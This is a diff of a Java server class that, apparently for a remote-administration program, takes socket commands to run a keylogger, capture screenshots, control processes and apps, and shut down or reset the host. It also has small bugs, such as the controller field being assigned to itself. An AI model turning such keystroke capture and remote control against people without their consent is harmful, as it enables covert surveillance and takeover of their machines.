@@ -13,7 +13,7 @@ import controller.Controller;
 import javax.imageio.ImageIO;
 
 public class Server {
-    private enum Status {
+    public enum Status {
         STOP,
         RUNNING,
     }
@@ -24,14 +24,15 @@ public class Server {
     private KeyLogger keyLogger;
     private Controller controller;
     private Status status;
+    private String IP;
     private boolean isHooked;
     private ScreenShot screenShot;
 
-    public Server(int port, int backlog) {
+    public Server() throws UnknownHostException {
+        this.IP = InetAddress.getLocalHost().getHostAddress();
         this.controller = controller;
-        createServerSocket(port, backlog);
         keyLogger = new KeyLogger();
-
+        screenShot = new ScreenShot();
         status = Status.STOP;
         isHooked = false;
 
@@ -47,92 +48,103 @@ public class Server {
             System.exit(1);
         }
 
-        screenShot = new ScreenShot();
     }
 
     public void run() {
         status = Status.RUNNING;
+        new Thread(() -> {
+            acceptClient();
+            notifyController("Connected");
 
-        new Thread(new Runnable() {
-            public void run() {
-                acceptClient();
+            while(status == Status.RUNNING) {
+                byte[] buffer = new byte[128];
+                try {
+                    inputStream.read(buffer);
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+                String action = new String(buffer).trim();
 
-                while(status == Status.RUNNING) {
-                    byte[] buffer = new byte[128];
-                    try {
-                        inputStream.read(buffer);
-                    } catch (IOException e) {
-                        e.printStackTrace();
+                switch (action) {
+                    case ("Hook"):
+                    case ("Unhook"):
+                    case ("Print"): {
+                        handleKeyLogging(action);
+                        break;
                     }
-                    String action = new String(buffer).trim();
+                    case ("Screen Shot"):
+                    {
+                        handleScreenShot(action);
+                        break;
+                    }
 
-                    switch (action) {
-                        case ("Hook"):
-                        case ("Unhook"):
-                        case ("Print"): {
-                            handleKeyLogging(action);
-                            break;
-                        }
-                        case ("ScreenShot"):
-                        {
-                            handleScreenShot(action);
-                            break;
-                        }
+                    case ("List Process"):
+                    case ("Stop Process"):
+                    case ("Start Process"):
+                    {
+                        handleProcess(action);
+                        break;
+                    }
 
-                        case ("ListProcess"):
-                        case ("StopProcess"):
-                        case ("StartProcess"):
-                        {
-                            handleProcess(action);
-                            break;
-                        }
+                    case ("List App Installed"):
+                    {
+                        notifyController(action);
+                        applicationModel.listAppInstalled();
+                        break;
+                    }
+                    case ("Start App Installed"):
+                    {
+                        notifyController(action);
+                        applicationModel.startApp();
+                        break;
+                    }
 
-                        case ("ListAppInstalled"):
-                        {
-                            applicationModel.listAppInstalled();
-                            break;
-                        }
-                        case ("StartAppInstalled"):
-                        {
-                            applicationModel.startApp();
-                            break;
-                        }
+                    case ("List App Running"):
+                    {
+                        notifyController(action);
+                        applicationModel.listAppRunning();
+                        break;
+                    }
+                    case ("Stop App Running"):
+                    {
+                        notifyController(action);
+                        applicationModel.stopAppRunning();
+                        break;
+                    }
 
-                        case ("ListAppRunning"):
-                        {
-                            applicationModel.listAppRunning();
-                            break;
-                        }
-                        case ("StopAppRunning"):
-                        {
-                            applicationModel.stopAppRunning();
-                            break;
-                        }
+                    case ("Exit"):
+                    {
+                        status = Status.STOP;
+                        break;
+                    }
 
-                        case ("Exit"):
-                        {
-                            status = Status.STOP;
-                            break;
-                        }
+                    case ("Shutdown"):
+                    {
+                        shutdownModel.handleShutdown();
+                        break;
+                    }
 
-                        case ("Shutdown"):
-                        {
-                            shutdownModel.handleShutdown();
-                            break;
-                        }
+                    case ("Reset"):
+                    {
+                        shutdownModel.handleReset();
+                        break;
+                    }
 
-                        case ("Reset"):
-                        {
-                            shutdownModel.handleReset();
-                            break;
-                        }
+                    case ("Close Connection"):
+                    {
+                        notifyController(action);
+                        controller.stop();
                     }
                 }
-
-                cleanup();
             }
+
+            cleanup();
         }).start();
 
+    }
+
+    public String getIP() {
+        return IP;
     }
 
     public void addController(Controller controller) {
@@ -157,6 +169,10 @@ public class Server {
             }
         }
         String line;
+    }
+
+    public void setStatus(Status status) {
+        this.status = status;
     }
 
     private void handleScreenShot(String action)
@@ -212,6 +228,22 @@ public class Server {
         }
     }
 
+    public ServerSocket getServerSock() {
+        return serverSock;
+    }
+
+    public Socket getClientSock() {
+        return clientSock;
+    }
+
+    public OutputStream getOutputStream() {
+        return outputStream;
+    }
+
+    public InputStream getInputStream() {
+        return inputStream;
+    }
+
     private void notifyController(String action) {
         controller.handleAction(action);
     }
@@ -231,7 +263,7 @@ public class Server {
         }
     }
 
-    private void createServerSocket(int port, int backlog) {
+    public void createServerSocket(int port, int backlog) {
         try {
             serverSock = new ServerSocket(port, backlog);
         }
